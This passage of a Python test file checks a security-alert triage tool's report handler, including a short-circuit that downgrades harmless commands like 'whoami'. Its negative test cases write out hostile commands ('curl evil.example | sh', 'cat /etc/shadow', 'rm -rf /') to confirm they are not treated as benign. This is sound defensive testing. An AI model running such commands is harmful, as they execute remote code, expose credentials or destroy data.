**Next action:** REPORT → disposition: benign, confidence: high, matched_archetype: monitoring-probe.
"""


class TestMechanicalAnalyzeCompose:
    def test_extract_findings_blocks_merges_across_loops(self, tmp_path):
        # The dense parser merges every ```invlang fence in the file into
        # one combined companion dict, so emitting findings across two
        # fences should collapse to a single ordered findings list.
        fence_a = companion_to_invlang_fence({
            "findings": [{
                "id": "l-001", "loop": 1, "name": "source-classification",
                "target": "v-001",
            }],
        })
        fence_b = companion_to_invlang_fence({
            "findings": [
                {"id": "l-002", "loop": 2, "name": "authentication-history",
                 "target": "v-001"},
                {"id": "l-003", "loop": 2, "name": "host-query",
                 "target": "v-001"},
            ],
        })
        md = (
            "## CONTEXTUALIZE\n\n" + fence_a + "\n\n"
            "## GATHER (loop 2)\n\n" + fence_b + "\n"
        )
        gather = report_handler._extract_findings_blocks(md)
        assert [g["id"] for g in gather] == ["l-001", "l-002", "l-003"]

    def test_extract_findings_blocks_skips_non_finding_blocks(self, tmp_path):
        # A non-finding block (e.g. a prologue-only fence) does not
        # contribute findings.
        prologue_fence = companion_to_invlang_fence({
            "prologue": {
                "vertices": [
                    {"id": "v-001", "type": "endpoint",
                     "classification": "internal", "identifier": "1.2.3.4"},
                ],
                "edges": [],
            },
        })
        findings_fence = companion_to_invlang_fence({
            "findings": [{
                "id": "l-001", "loop": 1, "name": "foo", "target": "v-001",
            }],
        })
        md = (
            "## CONTEXTUALIZE\n\n" + prologue_fence + "\n\n"
            + findings_fence + "\n"
        )
        gather = report_handler._extract_findings_blocks(md)
        assert [g["id"] for g in gather] == ["l-001"]

    def test_extract_findings_blocks_picks_up_dense_invlang_fence(self, tmp_path):
        """Regression: REPORT must read findings from the dense ```invlang
        surface, not just from legacy ```yaml fences. Without this the
        Hypothesis Outcomes / trace / Key Evidence sections fall back to
        survivor placeholders on dense ANALYZE-routed runs.
        """
        md = (
            "## ANALYZE (loop 1)\n\n"
            "```invlang\n"
            ":L findings [id|name|loop|target|mode|system|template|query|window|status]\n"
            "l-001|host-query|1||graded|wazuh||||active\n"
            "\n"
            ":T resolutions\n"
            "h-001  + → ++    [l-001 p1 severe ⟂ e-1]\n"
            "```\n"
        )
        gather = report_handler._extract_findings_blocks(md)
        assert [g["id"] for g in gather] == ["l-001"]
        # Top-level `resolutions` (dense canonical shape) — not under outcome.
        res = report_handler._entry_resolutions(gather[0])
        assert len(res) == 1
        assert res[0]["hypothesis_id"] == "h-001"
        assert res[0]["after"] == "++"

    def test_compose_hypothesis_outcomes_reads_dense_top_level(self):
        """`_compose_hypothesis_outcomes_md` must walk the canonical dense
        shape where resolutions sit at `entry['resolutions']` (not under
        `outcome.resolutions`) and weight is in the `after` field (not
        `weight` / `to_weight`).
        """
        findings = [{
            "id": "l-001",
            "name": "host-query",
            "resolutions": [{
                "hypothesis_id": "h-001",
                "before": "+",
                "after": "++",
                "severity_of_test": "severe",
            }],
        }]
        md = report_handler._compose_hypothesis_outcomes_md(findings, surviving_hypotheses=None)
        assert "h-001" in md
        assert "`++`" in md
        assert "host-query" in md

    def test_extract_final_analyze_section_returns_last(self, tmp_path):
        md = (
            "## CONTEXTUALIZE\n\nfoo.\n\n"
            "## ANALYZE (loop 1)\n\nfirst analyze.\n\n"
            "## GATHER (loop 2)\n\ngather.\n\n"
            "## ANALYZE (loop 2)\n\nsecond analyze with `--` grade on ?adversary-x.\n"
        )
        text = report_handler._extract_final_analyze_section(md)
        assert text.startswith("## ANALYZE (loop 2)")
        assert "second analyze" in text
        assert "first analyze" not in text

    def test_derive_termination_category_trust_root_from_anchor(self):
        # v2.11: trust-root fires on any edge-inline
        # authorization_resolutions[] with verdict: authorized.
        gather = [{
            "name": "l-001",
            "outcome": {
                "observations": {
                    "edges": [{
                        "id": "e-001",
                        "authorization_resolutions": [{"verdict": "authorized"}],
                    }],
                },
            },
        }]
        cat = report_handler._derive_termination_category({}, gather, "")
        assert cat == "trust-root"

    def test_derive_termination_category_adversarial_refuted(self):
        final_analyze = "?adversary-controlled-credentials: `--` — refuted by..."
        cat = report_handler._derive_termination_category({}, [], final_analyze)
        assert cat == "adversarial-refuted"

    def test_derive_termination_category_severity_ceiling(self):
        final_analyze = "composition rule triggered on 4× 100002 co-fires → escalate."
        cat = report_handler._derive_termination_category({}, [], final_analyze)
        assert cat == "severity-ceiling"

    def test_derive_termination_category_default_is_exhaustion(self):
        cat = report_handler._derive_termination_category({}, [], "no markers here")
        assert cat == "exhaustion-escalation"

    def test_compose_key_evidence_authz_verdict_with_as_of(self):
        findings = [{
            "name": "host-query",
            "outcome": {
                "observations": {
                    "edges": [{"authorization_resolutions": [
                        {"anchor_id": "cmdb", "verdict": "authorized",
                         "as_of": "2026-01-02T03:04:05Z"}
                    ]}],
                },
            },
        }]
        md = report_handler._compose_key_evidence_md(findings)
        assert "host-query" in md
        assert "anchor `cmdb` → `authorized`" in md
        assert "(as of 2026-01-02T03:04:05Z)" in md

    def test_compose_key_evidence_anchor_consultation(self):
        findings = [{
            "name": "registry-lookup",
            "outcome": {
                "anchor_consultations": [
                    {"anchor_id": "user-registry", "result": "confirmed"}
                ],
            },
        }]
        md = report_handler._compose_key_evidence_md(findings)
        assert "anchor `user-registry` → `confirmed`" in md
        assert "(as of" not in md

    def test_compose_key_evidence_attribute_update_kv(self):
        findings = [{
            "name": "source-classification",
            "outcome": {
                "attribute_updates": [
                    {"target": "v-001", "updates": {"classification": "internal"}}
                ],
            },
        }]
        md = report_handler._compose_key_evidence_md(findings)
        assert "`v-001.classification` = `internal`" in md

    def test_compose_key_evidence_attribute_update_empty_dict(self):
        findings = [{
            "name": "source-classification",
            "outcome": {
                "attribute_updates": [{"target": "v-001", "updates": {}}],
            },
        }]
        md = report_handler._compose_key_evidence_md(findings)
        assert "attribute update on `v-001`" in md

    def test_compose_key_evidence_attribute_update_empty_list(self):
        findings = [{
            "name": "source-classification",
            "outcome": {"attribute_updates": []},
            "status": "active",
        }]
        # Empty list is falsy → falls through to status fallback.
        md = report_handler._compose_key_evidence_md(findings)
        assert "lead completed (status: `active`)" in md

    def test_compose_key_evidence_resolutions_count(self):
        findings = [{
            "name": "host-query",
            "resolutions": [
                {"hypothesis_id": "h-001", "after": "++"},
                {"hypothesis_id": "h-002", "after": "--"},
            ],
        }]
        md = report_handler._compose_key_evidence_md(findings)
        assert "2 hypothesis resolution(s) recorded" in md

    def test_compose_key_evidence_fallback_to_status(self):
        findings = [{"name": "noop-lead", "outcome": {}, "status": "deferred"}]
        md = report_handler._compose_key_evidence_md(findings)
        assert "lead completed (status: `deferred`)" in md

    def test_compose_key_evidence_empty_findings(self):
        md = report_handler._compose_key_evidence_md([])
        assert md == "- (no findings leads recorded)"

    def test_compose_trace_analyze_authz_verdict(self):
        findings = [{
            "name": "host-query",
            "outcome": {
                "observations": {
                    "edges": [{"authorization_resolutions": [
                        {"anchor_id": "cmdb", "verdict": "authorized"}
                    ]}],
                },
            },
        }]
        trace = report_handler._compose_trace_analyze(
            findings, disposition="benign",
            surviving_hypotheses=None, matched_archetype="planned-maintenance",
        )
        assert trace == "host-query(authorized) → benign:planned-maintenance"

    def test_compose_trace_analyze_consultation_result(self):
        findings = [{
            "name": "registry",
            "outcome": {"anchor_consultations": [{"result": "confirmed"}]},
        }]
        trace = report_handler._compose_trace_analyze(
            findings, disposition="benign",
            surviving_hypotheses=["?monitoring-probe"], matched_archetype=None,
        )
        # surviving_hypotheses chosen over disposition when no archetype.
        assert trace == "registry(confirmed) → benign:?monitoring-probe"

    def test_compose_trace_analyze_resolution_after_field(self):
        findings = [{
            "name": "host-query",
            "resolutions": [{"hypothesis_id": "h-001", "after": "++"}],
        }]
        trace = report_handler._compose_trace_analyze(
            findings, disposition="escalated",
            surviving_hypotheses=None, matched_archetype=None,
        )
        assert trace == "host-query(++) → escalated"

    def test_compose_trace_analyze_attribute_update_classified(self):
        findings = [{
            "name": "source-classification",
            "outcome": {
                "attribute_updates": [{"target": "v-001", "updates": {"x": "y"}}]
            },
        }]
        trace = report_handler._compose_trace_analyze(
            findings, disposition="escalated",
            surviving_hypotheses=None, matched_archetype=None,
        )
        assert "(classified)" in trace

    def test_compose_trace_analyze_observed_fallback(self):
        findings = [{"name": "noop", "outcome": {}}]
        trace = report_handler._compose_trace_analyze(
            findings, disposition="escalated",
            surviving_hypotheses=None, matched_archetype=None,
        )
        assert trace == "noop(observed) → escalated"

    def test_compose_trace_analyze_no_findings_returns_tail_only(self):
        trace = report_handler._compose_trace_analyze(
            [], disposition="escalated",
            surviving_hypotheses=None, matched_archetype=None,
        )
        assert trace == "escalated"


class TestBenignActionShortCircuit:
    """Regression tests for the CONCLUDE-time benign-action override.

    The short-circuit fires when ANALYZE routes `disposition: true_positive`
    purely by exhaustion (no anchor confirmed it, no archetype grounded),
    the alert's command body is on the playbook's benign-action list, and
    termination_category is trust-root or exhaustion-escalation. It rewrites
    the disposition to `inconclusive` so a non-damaging command does not
    escalate to true_positive by exhaustion alone.
    """

    def test_normalize_command_body_strips_bash_dash_c(self):
        assert report_handler._normalize_command_body("bash -c whoami") == "whoami"
        assert report_handler._normalize_command_body("/bin/bash -c whoami") == "whoami"
        assert report_handler._normalize_command_body("sh -c 'id'") == "id"

    def test_normalize_command_body_lowercase_idempotent(self):
        # No wrapper to strip; just normalize case + whitespace.
        assert report_handler._normalize_command_body("WHOAMI") == "whoami"
        assert report_handler._normalize_command_body("  ls -la  ") == "ls -la"

    def test_command_body_matches_exact_entry(self):
        classes = ["whoami", "id", "hostname"]
        assert (
            report_handler._command_body_matches_benign_list("bash -c whoami", classes)
            == "whoami"
        )

    def test_command_body_matches_prefix_with_args(self):
        # `ls` on the list matches `ls -la /tmp` (same command + flags).
        classes = ["ls", "ps"]
        assert (
            report_handler._command_body_matches_benign_list("bash -c 'ls -la /tmp'", classes)
            == "ls"
        )

    def test_command_body_no_match_when_class_absent(self):
        classes = ["whoami", "id"]
        assert (
            report_handler._command_body_matches_benign_list("bash -c 'curl evil.example | sh'", classes)
            is None
        )

    def test_command_body_multi_token_class_requires_exact_prefix(self):
        # Multi-token class only matches when the body is the same prefix —
        # `cat /etc/os-release` matches that, not `cat /etc/shadow`.
        classes = ["cat /etc/os-release"]
        assert (
            report_handler._command_body_matches_benign_list(
                "bash -c 'cat /etc/os-release'", classes,
            )
            == "cat /etc/os-release"
        )
        assert (
            report_handler._command_body_matches_benign_list(
                "bash -c 'cat /etc/shadow'", classes,
            )
            is None
        )

    def test_short_circuit_no_op_when_disposition_not_true_positive(self, tmp_path):
        # ANALYZE routed benign — short-circuit must not interfere.
        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="benign",
            confidence="high",
            termination_category="trust-root",
            surviving_hypotheses=["h-001"],
        )
        assert (d, c, applied, matched) == ("benign", "high", False, None)

    def test_short_circuit_no_op_when_termination_not_trust_or_exhaustion(self, tmp_path):
        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="true_positive",
            confidence="medium",
            termination_category="adversarial-refuted",
            surviving_hypotheses=["h-001"],
        )
        # Adversarial-refuted is a meaningful escalation — don't override.
        assert (d, c, applied) == ("true_positive", "medium", False)

    def test_short_circuit_no_op_when_signature_lacks_benign_list(self, tmp_path):
        # 5710 has no `## Benign action classes` section.
        ctx = _make_ctx_for_shortcircuit(
            tmp_path, cmdline="bash -c whoami", signature_id="wazuh-rule-5710",
        )
        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="true_positive",
            confidence="medium",
            termination_category="exhaustion-escalation",
            surviving_hypotheses=[],
        )
        assert (d, c, applied) == ("true_positive", "medium", False)

    def test_short_circuit_fires_on_benign_command_at_trust_root(self, tmp_path):
        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c whoami")
        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="true_positive",
            confidence="medium",
            termination_category="trust-root",
            surviving_hypotheses=["h-001"],
        )
        assert (d, c, applied, matched) == ("inconclusive", "medium", True, "whoami")

    def test_short_circuit_fires_on_exhaustion_escalation_too(self, tmp_path):
        ctx = _make_ctx_for_shortcircuit(tmp_path, cmdline="bash -c id")
        d, c, applied, matched = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="true_positive",
            confidence="high",
            termination_category="exhaustion-escalation",
            surviving_hypotheses=["h-001"],
        )
        assert (d, c, applied, matched) == ("inconclusive", "medium", True, "id")

    def test_short_circuit_does_not_fire_for_destructive_command(self, tmp_path):
        ctx = _make_ctx_for_shortcircuit(
            tmp_path, cmdline="bash -c 'rm -rf /'",
        )
        d, c, applied, _ = report_handler._maybe_apply_benign_action_shortcircuit(
            ctx,
            disposition="true_positive",
            confidence="medium",
            termination_category="trust-root",
            surviving_hypotheses=["h-001"],
        )
        assert (d, c, applied) == ("true_positive", "medium", False)

    def test_termination_rationale_cites_benign_class_when_provided(self):
        rationale = report_handler._compose_termination_rationale(
            "trust-root", None, None, ["h-001"],
            benign_action_class="whoami",
        )
        assert "whoami" in rationale
        assert "inconclusive" in rationale.lower()


def _make_ctx_for_shortcircuit(
    tmp_path: Path, *, cmdline: str, signature_id: str = "wazuh-rule-100001",
) -> Context:
    """Minimal Context with a real alert.json carrying the chosen cmdline.

    The short-circuit reads the playbook directly off disk so signature_id
    must point at a real signature dir; tests use 100001 (which has the
    benign-action list) and 5710 (which doesn't) to exercise both branches.
    """
    import json
    run_dir = tmp_path / "run-shortcircuit"
    run_dir.mkdir()
    alert = {
        "id": "alert-shortcircuit",
        "data": {"output_fields": {"proc": {"cmdline": cmdline}}},
    }
    (run_dir / "alert.json").write_text(json.dumps(alert))
    return Context(
        run_dir=run_dir,
        signature_id=signature_id,
        ticket_id="0",
        alert=alert,
    )

    def test_mechanical_analyze_path_writes_report_and_invokes_narrative(
        self, tmp_path, monkeypatch,
    ):
        """Happy path: ANALYZE routes benign/high/monitoring-probe; gather YAML
        carries anchor confirmation. Handler composes structured fields,
        invokes narrative subagent once for Summary, writes report, passes
        Tier-1. No conclude-subagent call."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        captured_narr: list[str] = []

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            assert agent == "report_narrative"
            captured_narr.append(prompt)
            return (
                "<summary>\n"
                "The alert fired on an approved monitoring probe; "
                "anchor authorization confirmed.\n"
                "</summary>"
            )

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        # _invoke_subagent (the full-fallback dispatcher) must NOT fire.
        captured_full: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent",
            stub_invoke(captured_full, "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)

        assert captured_full == [], "full-context subagent must not fire"
        assert len(captured_narr) == 1
        assert result.payload["status"] == "written"
        assert result.payload["compose_mode"] == "analyze_mechanical"
        assert result.payload["status_frontmatter"] == "resolved"
        assert result.payload["matched_archetype"] == "monitoring-probe"

        report = (ctx.run_dir / "report.md").read_text()
        assert "status: resolved" in report
        assert "disposition: benign" in report
        assert "confidence: high" in report
        assert "## Summary" in report
        assert "approved monitoring probe" in report
        assert "## Hypothesis Outcomes" in report
        # Anchor confirmation is derived into trust_anchors_consulted
        assert "approved-monitoring-sources" in report
        # No For Analyst section on resolved
        assert "## For Analyst" not in report

        inv = (ctx.run_dir / "investigation.md").read_text()
        assert "## REPORT" in inv
        assert "category: trust-root" in inv
        assert "approved monitoring probe" in inv

    def test_mechanical_analyze_preload_omits_archetypes_when_null(
        self, tmp_path, monkeypatch,
    ):
        """archetype-match returns null → narrative preload carries no
        <archetypes> or <archetype ...> block, saving the ~15KB per-archetype
        bulk."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "unclear",
                "confidence": "medium",
                "matched_archetype": None,
                "surviving_hypotheses": ["h-003"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        captured_narr: list[str] = []

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: null\njustification: stub\n```"
            captured_narr.append(prompt)
            return (
                "<summary>\nEscalated with unresolved anchor.\n</summary>\n\n"
                "<for-analyst>\n- Check deploy-runs.\n- Verify jumphost.\n</for-analyst>"
            )

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)
        assert result.payload["compose_mode"] == "analyze_mechanical"
        assert result.payload["status_frontmatter"] == "escalated"

        prompt = captured_narr[0]
        # Null-archetype path must not load any archetype shapes.
        assert "<archetypes>" not in prompt
        assert "<archetype " not in prompt
        # But the alert and trimmed investigation must be there.
        assert "<alert-test-salt>" in prompt
        assert 'mode="report-narrative"' in prompt

        # Preload size floor — ANALYZE with no archetype block should come in
        # well under the full-context 50KB.
        assert len(prompt) < 16 * 1024, f"preload too large: {len(prompt)} bytes"

        report = (ctx.run_dir / "report.md").read_text()
        # For Analyst section appears on escalated with the narrative-authored text.
        assert "## For Analyst" in report
        assert "Check deploy-runs" in report
        assert "Verify jumphost" in report

    def test_mechanical_analyze_preload_loads_single_archetype_when_named(
        self, tmp_path, monkeypatch,
    ):
        """matched_archetype set → narrative preload loads exactly that one
        archetype's story/trust-anchors, not all signature archetypes."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        captured_narr: list[str] = []

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            captured_narr.append(prompt)
            return "<summary>\nResolved.\n</summary>"

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )
        report_handler.handle(ctx)

        prompt = captured_narr[0]
        assert 'name="monitoring-probe"' in prompt
        # Other 5710 archetypes must NOT be bundled (e.g. testuser-bruteforce).
        assert 'name="brute-force"' not in prompt
        assert 'name="credential-reuse"' not in prompt

    def test_narrative_subagent_missing_summary_tag_falls_back(
        self, tmp_path, monkeypatch,
    ):
        """Narrative stdout without `<summary>...</summary>` raises
        `_MechanicalFallback` → full-context subagent fires."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            return "I forgot the tags."

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        fallback_response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        captured_full: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent",
            stub_invoke(captured_full, fallback_response),
        )

        result = report_handler.handle(ctx)
        assert len(captured_full) == 1  # fallback fired
        assert result.payload["compose_mode"] == "subagent"
        assert "no <summary> block" in result.payload["mechanical_fallback_reason"]

    def test_narrative_subagent_insufficient_context_falls_back(
        self, tmp_path, monkeypatch,
    ):
        """Narrative returned the insufficient-context sentinel → fallback."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            return "<summary>\n(insufficient-context: missing routing block)\n</summary>"

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        fallback_response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        captured_full: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent",
            stub_invoke(captured_full, fallback_response),
        )
        result = report_handler.handle(ctx)
        assert len(captured_full) == 1
        assert "insufficient" in result.payload["mechanical_fallback_reason"].lower()

    def test_tier1_failure_on_analyze_mechanical_rolls_back(
        self, tmp_path, monkeypatch,
    ):
        """If Tier-1 rejects the mechanically-composed analyze report, roll
        back both writes before dispatching the full-context subagent."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        inv_before = (ctx.run_dir / "investigation.md").read_text()

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            return "<summary>\nResolved.\n</summary>"

        def fail_tier1(_path):
            from scripts.orchestrate import OrchestrationError
            raise OrchestrationError("simulated tier-1 rejection")

        monkeypatch.setattr(
            report_handler, "_shared_invoke", fake_narrative,
        )
        monkeypatch.setattr(
            report_handler, "_run_tier1_validation", fail_tier1,
        )
        fallback_response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: benign
        confidence: high
        matched_archetype: monitoring-probe
        status_frontmatter: resolved
        ```
        """).strip()
        captured_full: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent",
            stub_invoke(captured_full, fallback_response),
        )

        result = report_handler.handle(ctx)
        assert len(captured_full) == 1  # fallback fired
        assert result.payload["compose_mode"] == "subagent"
        assert "Tier-1" in result.payload["mechanical_fallback_reason"]
        # Rollback invariants.
        assert (ctx.run_dir / "investigation.md").read_text() == inv_before
        assert not (ctx.run_dir / "report.md").exists()

    def test_forced_report_skips_analyze_mechanical(
        self, tmp_path, monkeypatch,
    ):
        """ctx.forced_report=True means ANALYZE never ran coherently; the
        mechanical path must be bypassed. The full-context subagent fires
        with routing_source=forced_exhaustion."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        ctx.forced_report = True

        # Narrative MUST NOT fire.
        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            raise AssertionError("narrative subagent must not fire on forced_report")

        monkeypatch.setattr(report_handler, "_shared_invoke", fake_narrative)

        fallback_response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        captured_full: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent",
            stub_invoke(captured_full, fallback_response),
        )
        report_handler.handle(ctx)
        assert len(captured_full) == 1
        assert "routing_source=forced_exhaustion" in captured_full[0]

    def test_adversarial_disposition_forces_escalation_even_with_archetype(
        self, tmp_path, monkeypatch,
    ):
        """disposition=true_positive or unclear must NOT resolve, even
        if matched_archetype is set and anchors are confirmed. Mirrors the
        legitimacy-gated-disposition rule in invlang v2.9."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "true_positive",
                "confidence": "high",
                "matched_archetype": "monitoring-probe",
                "surviving_hypotheses": ["h-003"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            return (
                "<summary>\nAdversarial grade confirmed.\n</summary>\n\n"
                "<for-analyst>\n- Isolate host.\n</for-analyst>"
            )

        monkeypatch.setattr(report_handler, "_shared_invoke", fake_narrative)
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)
        assert result.payload["compose_mode"] == "analyze_mechanical"
        assert result.payload["status_frontmatter"] == "escalated"
        assert result.payload["disposition"] == "true_positive"

    def test_prose_form_gather_fallback_parser(self, tmp_path):
        """When investigation.md has no `findings:` YAML fences but has
        prose-form `## GATHER` sections with `**Lead:**` / `**Status:**`
        lines (the shape ANALYZE currently produces), the parser falls back
        to prose extraction and returns lead entries with name + status +
        loop. This is the real-world shape from orchestrator eval runs."""
        md = (
            "## CONTEXTUALIZE\n\nobserved.\n\n"
            "## GATHER (loop 1)\n\n"
            "**Lead:** container-baseline\n"
            "**Status:** ok\n"
            "**Query:** `rule.id:100001 --window 7d`\n\n"
            "**Raw observation:**\n- 35 events over 7 days\n\n"
            "## ANALYZE (loop 1)\n\nassessment.\n\n"
            "## GATHER (loop 2)\n\n"
            "**Lead:** deploy-runs-anchor\n"
            "**Status:** data_missing\n\n"
            "## ANALYZE (loop 2)\n\nfinal routing.\n"
        )
        gather = report_handler._extract_findings_blocks(md)
        assert len(gather) == 2
        assert gather[0]["name"] == "container-baseline"
        assert gather[0]["loop"] == 1
        assert gather[0]["status"] == "ok"
        assert gather[1]["name"] == "deploy-runs-anchor"
        assert gather[1]["status"] == "data_missing"

    def test_yaml_gather_block_preferred_over_prose(self, tmp_path):
        """When both YAML and prose forms are present, YAML wins — its
        structured outcome fields are needed for trust_anchors derivation."""
        md = (
            "## GATHER (loop 1)\n\n"
            "**Lead:** prose-form-lead\n\n"
            "```yaml\n"
            "findings:\n"
            "- id: l-001\n"
            "  name: yaml-form-lead\n"
            "  outcome:\n"
            "    anchor_consultations:\n"
            "      - anchor_id: x\n"
            "        result: confirmed\n"
            "```\n"
        )
        gather = report_handler._extract_findings_blocks(md)
        assert len(gather) == 1
        assert gather[0]["name"] == "yaml-form-lead"
        assert gather[0]["outcome"]["anchor_consultations"][0]["result"] == "confirmed"

    def test_analyze_unclear_disposition_passes_through(
        self, tmp_path, monkeypatch,
    ):
        """v2.11: ANALYZE emits disposition ∈ {benign, true_positive, unclear}
        directly — no handler-side remap. Non-benign dispositions always
        escalate; unclear specifically surfaces to frontmatter unchanged."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "unclear",
                "confidence": "medium",
                "matched_archetype": None,
                "surviving_hypotheses": ["h-001", "h-002"],
            },
            investigation_md=(
                "## CONTEXTUALIZE\n\n**Alert:** test\n\n"
                "## GATHER (loop 1)\n\n**Lead:** test-lead\n**Status:** ok\n\n"
                "## ANALYZE (loop 1)\n\nEscalation rationale.\n"
            ),
        )

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "archetype-match":
                return "```yaml\nmatched_archetype: monitoring-probe\njustification: stub\n```"
            return (
                "<summary>\nEscalated for analyst review.\n</summary>\n\n"
                "<for-analyst>\n- Verify X.\n</for-analyst>"
            )

        monkeypatch.setattr(report_handler, "_shared_invoke", fake_narrative)
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)
        assert result.payload["compose_mode"] == "analyze_mechanical"
        assert result.payload["status_frontmatter"] == "escalated"
        assert result.payload["disposition"] == "unclear"

        report = (ctx.run_dir / "report.md").read_text()
        assert "status: escalated" in report
        assert "disposition: unclear" in report
        # `escalated` is a status, never a disposition.
        assert "disposition: escalated" not in report

    def test_archetype_match_is_invoked_on_analyze_routed_path(
        self, tmp_path, monkeypatch,
    ):
        """REPORT handler must invoke archetype-match at dispatch time (the
        CONTEXTUALIZE→REPORT dispatch move). The matched_archetype in the
        written report must come from archetype-match's stub, not from
        analyze_payload."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                # Deliberately set to a value archetype-match will override.
                "matched_archetype": "analyze-was-authoritative-ignore-me",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        archetype_match_prompts: list[str] = []

        def fake_archetype(prompt, *, timeout=None, session_id=None):
            archetype_match_prompts.append(prompt)
            return "```yaml\nmatched_archetype: monitoring-probe\njustification: picked at REPORT time\n```"

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "report_narrative":
                return "<summary>\nResolved via anchor.\n</summary>"
            raise AssertionError(f"unexpected subagent: {agent}")

        monkeypatch.setattr(report_handler, "_invoke_archetype_match", fake_archetype)
        monkeypatch.setattr(report_handler, "_shared_invoke", fake_narrative)
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )

        result = report_handler.handle(ctx)
